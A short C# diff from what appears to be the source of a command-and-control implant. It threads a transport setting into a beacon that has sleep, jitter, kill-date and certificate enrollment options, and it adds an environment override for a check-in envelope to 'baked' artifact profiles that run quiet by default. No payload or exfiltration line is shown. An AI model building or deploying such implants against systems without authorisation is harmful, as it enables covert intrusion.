@@ -115,7 +115,7 @@ internal static class ImplantApp
         var envelopeBeacon = new EnvelopeBeacon(
             egress, enrollment.ImplantId, enrollment.Leaf, enrollment.CAs,
             config.Sleep, config.Jitter, config.HasKillDate ? config.KillDate : null, enroll,
-            config.ClassVerbs, log, nonces);
+            config.ClassVerbs, log, nonces, config.Transport);
         try
         {
             while (true)
@@ -277,6 +277,7 @@ internal static class BakedProfileSupport
         SetEnvIfPresent(root, "requestTimeout", "ROD_REQUEST_TIMEOUT");
         SetEnvIfPresent(root, "envelope", "ROD_ENVELOPE");
         SetEnvIfPresent(root, "envelopeKey", "ROD_ENVELOPE_KEY");
+        SetEnvIfPresent(root, "checkinEnvelope", "ROD_CHECKIN_ENVELOPE");
         // The pipeline bakes quiet=true for every artifact; a debugging run
         // presets ROD_QUIET=0 to override it (SetEnvIfPresent leaves an
         // already-set variable untouched).
